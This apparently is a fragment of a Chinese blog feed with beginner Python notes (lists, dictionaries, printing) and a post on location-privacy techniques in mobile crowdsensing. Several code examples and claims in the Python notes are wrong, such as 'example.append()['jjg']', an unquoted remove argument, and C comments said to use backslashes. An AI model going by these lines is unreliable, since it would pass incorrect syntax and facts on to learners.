&#x27;JUN&#x27;, &#x27;sexual&#x27;: &#x27;male&#x27;&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="在字典中储存列表"><a class="markdownIt-Anchor" href="#在字典中储存列表"></a> 在字典中储存列表</h3><p>有时候，需要把列表储存在字典中，比如储存一个披萨的配料列表什么的。当我们需要把字典中的一个键关联到多个值时，我们就可以采用字典嵌套列表的方法。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">author=&#123;</span><br><span class="line">    <span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;adam ben&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;sexual&#x27;</span>:<span class="string">&#x27;male&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;games&#x27;</span>:[<span class="string">&#x27;to the moon&#x27;</span>,<span class="string">&#x27;finding paradise&#x27;</span>,<span class="string">&#x27;impostor factory&#x27;</span>],</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;The author&#x27;s name is <span class="subst">&#123;author[<span class="string">&#x27;name&#x27;</span>].title()&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> game <span class="keyword">in</span> author[<span class="string">&#x27;games&#x27;</span>]:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;And his favorite game is &quot;</span>+game.title())</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;The author&#x27;s name is Adam Ben</span></span><br><span class="line"><span class="string">And his favorite game is To The Moon</span></span><br><span class="line"><span class="string">And his favorite game is Finding Paradise</span></span><br><span class="line"><span class="string">And his favorite game is Impostor Factory</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>不过，列表和字典的嵌套层数不宜过多，否则会降低代码可读性。一般来说如果使用了多层嵌套，往往有更简单的方法。</p><h3 id="在字典中储存字典"><a class="markdownIt-Anchor" href="#在字典中储存字典"></a> 在字典中储存字典</h3><p>字典嵌套字典，这么做可能会使代码快速变得复杂。这里照搬书上的一个例子加深理解，假如一个网站有多个用户，用户又有着独特的用户名，然后再利用每个用户的用户名储存三个关于他们的信息。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">users=&#123;</span><br><span class="line">    <span class="string">&#x27;big_house_monkey&#x27;</span>:&#123;</span><br><span class="line">        <span class="string">&#x27;fname&#x27;</span>:<span class="string">&#x27;adam&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;lname&#x27;</span>:<span class="string">&#x27;ben&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;location&#x27;</span>:<span class="string">&#x27;chenzhou&#x27;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&#x27;panda&#x27;</span>:&#123;</span><br><span class="line">        <span class="string">&#x27;fname&#x27;</span>:<span class="string">&#x27;frank&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;lname&#x27;</span>:<span class="string">&#x27;ken&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;location&#x27;</span>:<span class="string">&#x27;nanchang&#x27;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&#x27;balloonfish&#x27;</span>:&#123;</span><br><span class="line">        <span class="string">&#x27;fname&#x27;</span>:<span class="string">&#x27;victory&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;lname&#x27;</span>:<span class="string">&#x27;hippo&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;location&#x27;</span>:<span class="string">&#x27;jinan&#x27;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> username,user_info <span class="keyword">in</span> users.items():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\nUsername: &quot;</span>+username)</span><br><span class="line">    full_name=user_info[<span class="string">&#x27;fname&#x27;</span>]+<span class="string">&#x27; &#x27;</span>+user_info[<span class="string">&#x27;lname&#x27;</span>]</span><br><span class="line">    location=user_info[<span class="string">&#x27;location&#x27;</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\tFull name: &quot;</span>+full_name.title())</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\tLocation: &quot;</span>+location.title())</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;Username: big_house_monkey</span></span><br><span class="line"><span class="string">        Full name: Adam Ben</span></span><br><span class="line"><span class="string">        Location: Chenzhou</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Username: panda</span></span><br><span class="line"><span class="string">        Full name: Frank Ken</span></span><br><span class="line"><span class="string">        Location: Nanchang</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Username: balloonfish</span></span><br><span class="line"><span class="string">        Full name: Victory Hippo</span></span><br><span class="line"><span class="string">        Location: Jinan</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/55982257_p0.jpg" alt="img" /></p>]]></content>
      
      
      <categories>
          
          <category> Python学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从零开始学Python（一）</title>
      <link href="/posts/b4f4880c13ef/"/>
      <url>/posts/b4f4880c13ef/</url>
      
        <content type="html"><![CDATA[<p>零零散散更新一些Python随笔录，我用的书是《Python编程：从入门到实践》，主要是参照这本书写一些知识点。</p><hr /><h1 id="一-起步"><a class="markdownIt-Anchor" href="#一-起步"></a> 一、起步</h1><p>安装好环境以后就可以开始进行Python学习了，怎么安装环境不多赘述。</p><p>关于编辑器，我暂且用的是VsCode。本来想用Sublime Text的，但是懒得折腾了。</p><p>Pycharm和Visual Studio也是可以的，后者功能全面，但是太过笨重，比较适合新手使用。</p><h1 id="二-变量和基本数据类型"><a class="markdownIt-Anchor" href="#二-变量和基本数据类型"></a> 二、变量和基本数据类型</h1><h2 id="变量"><a class="markdownIt-Anchor" href="#变量"></a> 变量</h2><p>Python中的变量不需要实现声明其数据类型，这一点和C不同，即开即用，十分方便。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">name=<span class="string">&quot;Adam Ben&quot;</span></span><br></pre></td></tr></table></figure><h2 id="print函数"><a class="markdownIt-Anchor" href="#print函数"></a> print函数</h2><p>和C语言的printf函数有些类似，但是引用变量的方式有些许差异。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> name[<span class="number">10</span>]=<span class="string">&quot;Adam Ben&quot;</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Hi,%s&quot;</span>,name);<span class="comment">//C语言打印名字</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">name=<span class="string">&quot;Adam Ben&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Hi <span class="subst">&#123;name&#125;</span>&quot;</span>)<span class="comment">#Python打印名字</span></span><br></pre></td></tr></table></figure><p>在前引号前加入f告诉编译器替换花括号中变量的值。</p><p>当然也可以不使用f语法，而是使用format()方法。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">name=<span class="string">&quot;Adam Ben&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(name))</span><br></pre></td></tr></table></figure><h2 id="其他相关输出函数"><a class="markdownIt-Anchor" href="#其他相关输出函数"></a> 其他相关输出函数</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">name=<span class="string">&quot; Adam Ben &quot;</span></span><br><span class="line">name.rstrip()<span class="comment">#删除字符串末尾空白</span></span><br><span class="line">name.lstrip()<span class="comment">#删除字符串头部空白</span></span><br><span class="line">name.strip()<span class="comment">#删除字符串两边空白</span></span><br><span class="line">name.title()<span class="comment">#首字母大写</span></span><br><span class="line">name.upper()<span class="comment">#字符串大写</span></span><br><span class="line">name.lower()<span class="comment">#字符串小写</span></span><br></pre></td></tr></table></figure><h2 id="数"><a class="markdownIt-Anchor" href="#数"></a> 数</h2><p>Python能够通过+、-、*、/进行四则运算。</p><p>其中//表示强制除法，取整而舍弃余数。</p><p>在除法运算中，得到的计算结果总为浮点数。在其他任何运算中（//例外），只要有一方是浮点数，那么结果总为浮点数。</p><p>在Python中，大数无位数限制，而C语言通常由它的数据类型决定（int、long……）。这就意味着Python可以进行大数运算。但是仍然存在小数位数强制截断的问题。</p><p>Python中可以给大数加入下划线进行分组，但是输出时Python不会将下划线打印出来。</p><p>Python可以同时给多个变量赋值。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a,b,c=<span class="number">1</span>,<span class="number">2.3</span>,<span class="number">14_000_000_000</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">c</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;14000000000</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="注释"><a class="markdownIt-Anchor" href="#注释"></a> 注释</h2><p>Python使用井号#表示注释，编译器会自动忽略#后的内容。</p><p>或者使用’‘‘xxx’’'来插入跨行字符串用于注释。</p><p>而C语言则是使用双反斜杠用于注释 \\</p><h2 id="python之禅"><a class="markdownIt-Anchor" href="#python之禅"></a> Python之禅</h2><p>在Python中使用import this可查看。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> this</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">The Zen of Python, by Tim Peters</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Beautiful is better than ugly.</span></span><br><span class="line"><span class="string">Explicit is better than implicit.</span></span><br><span class="line"><span class="string">Simple is better than complex.</span></span><br><span class="line"><span class="string">Complex is better than complicated.</span></span><br><span class="line"><span class="string">Flat is better than nested.</span></span><br><span class="line"><span class="string">Sparse is better than dense.</span></span><br><span class="line"><span class="string">Readability counts.</span></span><br><span class="line"><span class="string">Special cases aren&#x27;t special enough to break the rules.</span></span><br><span class="line"><span class="string">Although practicality beats purity.</span></span><br><span class="line"><span class="string">Errors should never pass silently.</span></span><br><span class="line"><span class="string">Unless explicitly silenced.</span></span><br><span class="line"><span class="string">In the face of ambiguity, refuse the temptation to guess.</span></span><br><span class="line"><span class="string">There should be one-- and preferably only one --obvious way to do it.</span></span><br><span class="line"><span class="string">Although that way may not be obvious at first unless you&#x27;re Dutch.</span></span><br><span class="line"><span class="string">Now is better than never.</span></span><br><span class="line"><span class="string">Although never is often better than *right* now.</span></span><br><span class="line"><span class="string">If the implementation is hard to explain, it&#x27;s a bad idea.</span></span><br><span class="line"><span class="string">If the implementation is easy to explain, it may be a good idea.</span></span><br><span class="line"><span class="string">Namespaces are one honking great idea -- let&#x27;s do more of those!</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="三-列表简介"><a class="markdownIt-Anchor" href="#三-列表简介"></a> 三、列表简介</h1><h2 id="什么是列表"><a class="markdownIt-Anchor" href="#什么是列表"></a> 什么是列表</h2><p>一位唤作wahaha的贤者注释道，列表是“可扩容的动态数组”。我觉得还可以加几句，列表是“不限制数据类型可扩容的动态数组”。（相较于C来说）</p><p>如果在C中想要实现Python的列表，估计得手搓一个动态链表。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">example=[<span class="string">&#x27;Adam&#x27;</span>,<span class="string">&#x27;Ben&#x27;</span>,<span class="string">&#x27;JJG&#x27;</span>]<span class="comment">#列表元素之间使用逗号分隔</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">print(example)</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;[&#x27;adam&#x27;,&#x27;Ben&#x27;,&#x27;JJG&#x27;]</span></span><br><span class="line"><span class="string">输出包括方括号</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>当然，我们不想让Python输出方括号，所以我们使用索引，用法和C语言大致相同。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(example[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(example[<span class="number">0</span>].title())<span class="comment">#也可以使用title函数</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;adam</span></span><br><span class="line"><span class="string">Adam</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>和C语言的区别是，Python对于列表可以采用负数索引，比如example[-1]就是输出’JJG’，也就是输出列表最后一个元素，同理采用-2作为索引即输出倒数第二个元素，以此类推。</p><p>这个特性非常有用，有时候我们并不知道列表长度，此时采用负数索引即可更为方便的输出列表后位元素。</p><h2 id="修改-添加-删除列表元素"><a class="markdownIt-Anchor" href="#修改-添加-删除列表元素"></a> 修改、添加、删除列表元素</h2><p><strong>修改</strong>列表元素很简单，相当于对数组元素进行重新赋值，修改对应的索引对应值就好。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">example=[<span class="string">&#x27;Adam&#x27;</span>,<span class="string">&#x27;Ben&#x27;</span>,<span class="string">&#x27;JJG&#x27;</span>]</span><br><span class="line">example[<span class="number">0</span>]=<span class="string">&#x27;jjg&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">print(example[0])</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;jjg</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>在列表中<strong>添加</strong>元素要用到append函数。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">example=[<span class="string">&#x27;Adam&#x27;</span>,<span class="string">&#x27;Ben&#x27;</span>,<span class="string">&#x27;JJG&#x27;</span>]</span><br><span class="line">example.append()[<span class="string">&#x27;jjg&#x27;</span>]</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">print(example)</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;[&#x27;Adam&#x27;,&#x27;Ben&#x27;,&#x27;JJG&#x27;,&#x27;jjg&#x27;]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>在列表中<strong>插入</strong>元素要用到insert函数。使用方法为insert(n,“xxx”)，表示在第n个元素前插入&quot;xxx&quot;。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">example=[<span class="string">&#x27;Adam&#x27;</span>,<span class="string">&#x27;Ben&#x27;</span>,<span class="string">&#x27;JJG&#x27;</span>]</span><br><span class="line">example.insert(<span class="number">0</span>,<span class="string">&#x27;jjg&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">pirnt(example)</span></span><br><span class="line"><span class="string">[&#x27;jjg&#x27;,&#x27;Adam&#x27;,&#x27;Ben&#x27;,&#x27;JJG&#x27;]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>从列表中<strong>删除</strong>元素涉及到三个函数，分别是del，pop和remove。</p><p>del函数直接删除列表元素，而pop函数则是类似于“弹出”列表末尾元素让你能够接着使用它，而remove函数则是根据元素值而不是索引删除元素。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">example=[<span class="string">&#x27;Adam&#x27;</span>,<span class="string">&#x27;Ben&#x27;</span>,<span class="string">&#x27;JJG&#x27;</span>]</span><br><span class="line"><span class="keyword">del</span> example[<span class="number">0</span>]<span class="comment">#删除第一个元素1</span></span><br><span class="line"><span class="built_in">print</span>(example)</span><br><span class="line">J=example.pop()<span class="comment">#删除末尾元素，并把值赋给变量J</span></span><br><span class="line"><span class="comment">#当pop(x)括号内有值时，可根据索引弹出任意列表元素值，否则默认弹出末尾值</span></span><br><span class="line"><span class="built_in">print</span>(example)</span><br><span class="line"><span class="built_in">print</span>(J)</span><br><span class="line">example.remove(JJG)<span class="comment">#总是从左往右删除第一个符合的值</span></span><br><span class="line"><span class="comment">#如果需要删除的值在列表中出现多次，那么就引入循环来确保值被删除</span></span><br><span class="line"><span class="built_in">print</span>(example)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;[&#x27;Ben&#x27;,&#x27;JJG&#x27;]</span></span><br><span class="line"><span class="string">[&#x27;Ben&#x27;]</span></span><br><span class="line"><span class="string">&#x27;JJG&#x27;</span></span><br><span class="line"><span class="string">[]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="组织列表"><a class="markdownIt-Anchor" href="#组织列表"></a> 组织列表</h2><p>可以使用sort函数对列表进行永久性的排序，或者是sorted函数进行暂时性的排序，也就是仅对返回值进行排序。</p><p>排序方式是按照字母的大小顺序进行，也就是a-z。本质上是基于ASCII码进行的排序，也就是说sort函数会优先进行大写字母排序，而且大写字母将永远排在小写字母前。当首字母相同时，排序第二个字母，以此类推。</p><p>向sort函数传递参数reverse=True可以按照与字母排序相反的规则排序。</p><p><strong>注意sort函数和sorted函数的使用区别。</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">example=[<span class="string">&#x27;Ben&#x27;</span>,<span class="string">&#x27;Adam&#x27;</span>,<span class="string">&#x27;JJG&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">sorted</span>(example))</span><br><span class="line">example.sort(reverse=<span class="literal">True</span>)</span><br><span class="line"><span class="built_in">print</span>(example)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;[&#x27;Adam&#x27;, &#x27;Ben&#x27;, &#x27;JJG&#x27;]</span></span><br><span class="line"><span class="string">[&#x27;JJG&#x27;, &#x27;Ben&#x27;, &#x27;Adam&#x27;]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>还可以使用reverse函数对列表进行倒序排列。reverse函数并不是按字母倒序排列列表，而只是简单的反转了列表排列顺序。</p><p>虽然reverse函数会永久性改变列表排列顺序，但是想要恢复并不难，再使用一次reverse函数即可。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">example=[<span class="string">&#x27;Ben&#x27;</span>,<span class="string">&#x27;Adam&#x27;</span>,<span class="string">&#x27;JJG&#x27;</span>]</span><br><span class="line">example.reverse()</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">print(example)</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;[&#x27;JJG&#x27;, &#x27;Adam&#x27;, &#x27;Ben&#x27;]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>此外，还可以用len函数确定列表长度，这点类似于C语言中String.h头文件下的length()函数。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">example=[<span class="string">&#x27;Ben&#x27;</span>,<span class="string">&#x27;Adam&#x27;</span>,<span class="string">&#x27;JJG&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(example))</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;3</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>除此之外，留意由于索引引发的错误，常见于引用一个列表中并不存在的元素。比如在example列表中要求输出example[3]，这将会引发IndexError。</p><p>遇到此类情况时，最好的办法是使用-1来作为索引，因为它永远只会打印出最后一个元素，除非列表元素为零。</p><p>当触发索引错误时，最好用len函数确定一下列表长度。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/%E5%A4%8D%E4%BB%B6%2082457624_p0.png" alt="复件 82457624_p0" /></p>]]></content>
      
      
      <categories>
          
          <category> Python学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于移动群智感知中的隐私保护的一些理解</title>
      <link href="/posts/1616990c38e1/"/>
      <url>/posts/1616990c38e1/</url>
      
        <content type="html"><![CDATA[<h4 id="众包的概念"><a class="markdownIt-Anchor" href="#众包的概念"></a> 众包的概念</h4><p>某项任务交由个人或者集体难以完成或者成本过高，于是众包给大量未经过专业培训的普通人，以此来显著降低开销的一种方式。这一点与<strong>外包</strong>正好相反，后者是将任务交给某个专业的团队去完成。</p><h4 id="移动众包mobile-crowdsourcingmcs的应用"><a class="markdownIt-Anchor" href="#移动众包mobile-crowdsourcingmcs的应用"></a> 移动众包（Mobile Crowdsourcing/MCS）的应用</h4><p>比如天气信息，空气质量，电磁辐射，交通流量等。通过在使用者的移动设备上装置传感器，来达到实时监测使用者位置的数据的方式。近年来智能手机快速发展，提供了合适的装置，而5G和WIFI的出现也使得大规模移动数据传输成为可能。</p><p>比如在百度地图中显示某段道路的客流量大小。传统做法是通过在路口设立摄像头等监控装置来监测客流量，但是这么做成本极高且需要长期保养，投入价值不菲。因而我们选择将这项服务交给<strong>移动众包</strong>来完成，即在每辆车的引擎上配置传感器，将车辆位置、速度等数据发送给MCS服务器，然后再根据算法计算客流量。</p><h4 id="移动众包带来的隐私泄露隐患与隐私算法"><a class="markdownIt-Anchor" href="#移动众包带来的隐私泄露隐患与隐私算法"></a> 移动众包带来的隐私泄露隐患与隐私算法</h4><p>由于基于地点的移动众包需要参与者的位置信息，人们不得不向服务器公开自己的具体位置，这导致了一些人认为这是在泄露他们的隐私。所以，基于地点的隐私保护算法，旨在对用户的地点信息进行加密保护，同时让服务器正常工作，以吸引更多用户参加MCS，从而逐步取缔传统的方法，极大的降低开销。</p><p>隐私算法的本质是在让攻击者和服务器本身无法做到特定的调出某个用户的数据，同时让服务器正常应用数据组。但是应用隐私算法有几个难点：</p><p>①算力开销。由于采用了加密算法去加密真实的地理位置，将会产生额外的算力开销。</p><p>②数据可靠度降低。由于对数据采用了模糊的方式处理，会使得数据实用性降低。</p><h4 id="移动众包隐私算法的几个数据模型mcs"><a class="markdownIt-Anchor" href="#移动众包隐私算法的几个数据模型mcs"></a> 移动众包隐私算法的几个数据模型/MCS</h4><h5 id="隐匿模型anonymization"><a class="markdownIt-Anchor" href="#隐匿模型anonymization"></a> 隐匿模型/Anonymization</h5><p>把用户的真实信息隐匿，或者设置一个分类组合并几个用户的数据集，让单独区分某个数据的过程变得极为困难。例如现在较流行的k-anonymization算法。</p><h5 id="差分模型differential-privacy"><a class="markdownIt-Anchor" href="#差分模型differential-privacy"></a> 差分模型/Differential privacy</h5><p>引入<strong>噪声</strong>，即加入干扰机制，使得攻击者无法获得拥有高可信度的数据。</p><h4 id="基于地址服务的几个保护位置信息的隐私算法location-based-servicelbs"><a class="markdownIt-Anchor" href="#基于地址服务的几个保护位置信息的隐私算法location-based-servicelbs"></a> 基于地址服务的几个保护位置信息的隐私算法/Location-based service/LBS</h4><h5 id="隐匿技术"><a class="markdownIt-Anchor" href="#隐匿技术"></a> 隐匿技术</h5><p>假如一片地区内有多个用户，数量大于等于k，即可应用k-anonymization算法，计算出一个遮罩地区，代替用户的精确位置返回给服务器。</p><h5 id="傻瓜技术"><a class="markdownIt-Anchor" href="#傻瓜技术"></a> 傻瓜技术（？）</h5><p>在一个用户的周围随机的生成几个虚假的位置点返回给服务器，这样服务器就认不出哪一个是用户真实的具体位置。</p><h5 id="混淆技术"><a class="markdownIt-Anchor" href="#混淆技术"></a> 混淆技术</h5><p>基于一种权衡摄动大小和数据实用度的技术，在尽可能保持服务器正常工作的前提下对真实位置进行模糊，让攻击者无法获得高可信度的数据。</p><h5 id="加密技术"><a class="markdownIt-Anchor" href="#加密技术"></a> 加密技术</h5><p>直接对用户的位置信息进行加密，这样对于未授权的<strong>LBS</strong>服务器就无法获得用户的具体信息，从而保护用户隐私，但是会产生较大的算力开销。</p><h4 id="移动众包中的地址隐私保护"><a class="markdownIt-Anchor" href="#移动众包中的地址隐私保护"></a> 移动众包中的地址隐私保护</h4><p>移动众包中主要有三个组成部分：指令员，MCS服务提供者，工作者。</p><ul><li>服务提供者提供平台，他们负责接收指令员下发的工作指令，并把任务下发给合适的工作者，再把总结果打包返回给指令员。对于服务者来说，他们要完成的事有①把任务以低廉高效的方式发送给工作者②对每个工作者个体的地理位置信息进行加密③筛选出值得信赖有用的数据返回给指令员④激励并促使工作者更加积极地参与工作。</li><li>指令员是提交任务的最终使用者，他们要求在某一个特定的地点完成特定的任务。他们可以是缺乏安装足够传感器的能力的个人或者集体，并且希望能使用MCS服务来降低成本。</li><li>工作者是自愿参与MCS项目的个体，他们通过完成MCS平台上发布的任务来获得奖励。这些任务通常要求工作者公开他们的位置信息，因此产生了可能的隐私泄露问题，影响了工作者参与MCS项目的积极性且不利于更多人员假如MCS项目。</li></ul><p>根据移动众包中各种地址隐私保护技术的特征分类，主要有三种：MCS-TP, MCS-P2P, MCS-LOC</p><ul><li>TP即Trusted Party，一个信任的中间服务器，接收用户的真实地理信息，随后进行加密再提交给MCS平台进行处理。</li><li>P2P即peer-to-peer communication，指工作者和MCS平台间不存在第三方服务器，直接进行通讯，加密在工作者的移动设备上直接完成，但是这种加密依赖于工作者之间的交流进行混淆加密。</li><li>LOC即locally，工作者和MCS平台也是直接进行通讯，但是加密过程不依赖工作者之间的位置交流，也就是说加密过程必须在工作者的移动设备上完全本地化进行。</li></ul><p>目前，<strong>隐匿算法</strong>和<strong>DP算法</strong>是最流行的两种加密方式。早期的项目一般采用<strong>k-anonymization</strong>，而现在更多的人开始开发出各种各样的<strong>DP算法</strong>，甚至已经有人开始研究特定的<strong>加密算法</strong>来保护工作者的地址隐私。</p><p>关于这三种技术的算力开销，TP模型开销相对较小，因为计算大都在第三方服务器上进行，P2P次之，而LOC的加密过程完全在工作者本地的移动设备上进行，所以算力开销最大。</p><h4 id="数据实用性"><a class="markdownIt-Anchor" href="#数据实用性"></a> 数据实用性</h4><p>对工作者的地址信息进行保护，提高了他们的隐私性，但是也影响了传感器的任务返回结果。我们需要在隐私保护和数据实用性之间进行权衡，这种问题永远存在。一般来说，决定这种权衡有两种方式，一种是把选择权交给用户自己决定，是降低他们的位置信息隐私程度来获取更加精确的服务还是提高隐私性；亦或者选择权完全交由MCS中心平台决定。</p><h4 id="lbs和mcs在地址隐私保护中的比较"><a class="markdownIt-Anchor" href="#lbs和mcs在地址隐私保护中的比较"></a> LBS和MCS在地址隐私保护中的比较</h4><ol><li>LBS主要专注于对用户的地址信息隐私保护，但是MCS需要在隐私保护和数据有效性间进行权衡，它需要保证用户的数据隐私性并且以低廉高效的方式分配并完成任务。</li><li>LBS接收用户的地址信息通常不包含敏感的数据。但是MCS发布的任务是基于位置的敏感信息，攻击者可以通过渗透用户的地址数据来找出那些敏感的任务地点。因此，MCS的任务结果和工作者位置信息都需要保护。</li><li>LBS是一项以用户为中心的技术，他们的隐私保护程度可以由用户自己决定，但是MCS更多是以平台为中心的技术，数据的隐私保护程度受到平台的统一调配。</li><li>LBS的目的是为用户提供地址服务，是建立在每个用户的单个位置基础上进行服务。而MCS正好相反，它旨在收集每个工作者个体的任务结果并把它统一反馈给指令员。也就是说，MCS是建立在大量的工作者位置信息之上的。因此，考虑所有参与者位置的整体视角显得至关重要。</li></ol><p>基于以上原因，为LBS设计的地址保护技术并不能直接应用在MCS中，必须进行改进或重新设计。</p><h4 id="mcs中的位置隐私保护技术"><a class="markdownIt-Anchor" href="#mcs中的位置隐私保护技术"></a> MCS中的位置隐私保护技术</h4><p>主要分为三类：基于空间隐身，基于DP的方法和基于加密的方法。</p><h5 id="基于空间隐身"><a class="markdownIt-Anchor" href="#基于空间隐身"></a> 基于空间隐身</h5><p>即向MCS平台报告粗略的信息，而不是详细的具体位置。</p><h6 id="机制"><a class="markdownIt-Anchor" href="#机制"></a> 机制</h6><p>AnonySense，第一个利用K-anonymity保护MCS中工作者的位置隐私的工作。生成一个镶嵌地图，将一个地理区域划分为一组瓷砖，每个瓷砖内有k名工作者。</p><p>具体实现过程为，将WIFI接入点（ap）的位置映射为二维平面。然后构建Voronoi图。然后使用历史ap活动记录估计每个单元中的工作者数量。最后将Voronoi单元聚集在块中，使得每个块满足K-anonymity，进行保护。但是AnonySense需要一个可信方，因为镶嵌地图是根据工作者的实际位置构建的。</p><p>实际运用中，有些瓷砖块有相当大的区域导致传感任务结果质量降低，有人提出了可变大小的最大距离平均向量算法（VMDAV）来解决。</p><p>还有人提出了一种贪婪算法，保护工作者隐私的同时，最大化来自工作者的任务结果质量。</p><p>……</p><h6 id="讨论"><a class="markdownIt-Anchor" href="#讨论"></a> 讨论</h6><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/20230904105752.png" alt="img" /></p><h5 id="基于dp的方法"><a class="markdownIt-Anchor" href="#基于dp的方法"></a> 基于DP的方法</h5><p>可进一步分为基于psd（私密空间分解）和基于geoind的方法。</p><h6 id="讨论-2"><a class="markdownIt-Anchor" href="#讨论-2"></a> 讨论</h6><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/20230904105839.png" alt="img" /></p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/20230904110124.png" alt="img" /></p><h5 id="基于加密的方法"><a class="markdownIt-Anchor" 